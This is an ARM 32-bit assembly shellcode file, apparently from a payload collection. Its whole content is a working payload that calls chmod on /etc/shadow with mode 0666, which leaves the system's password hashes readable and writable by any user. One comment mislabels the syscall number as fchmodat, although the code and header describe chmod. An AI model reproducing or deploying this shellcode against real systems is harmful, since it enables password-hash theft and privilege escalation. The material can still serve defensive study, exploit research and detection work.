# ARM Little Endian 32-bit chmod(/etc/shadow, 0666) shellcode
# ---
# bcoles

.global _start
.section .text

_start:
    # sys_chmod(const char *filename, umode_t mode);
    # chmod("/etc/shadow", 0666)

    adr   r0, path     // pointer to path
    mov   r1, #0666    // mode_t
    mov   r7, #15      // __NR_fchmodat
    svc   #0

    mov   r0, #0       // exit code
    mov   r7, #1       // __NR_exit
    svc   #0

path:
    .asciz "/etc/shadow"
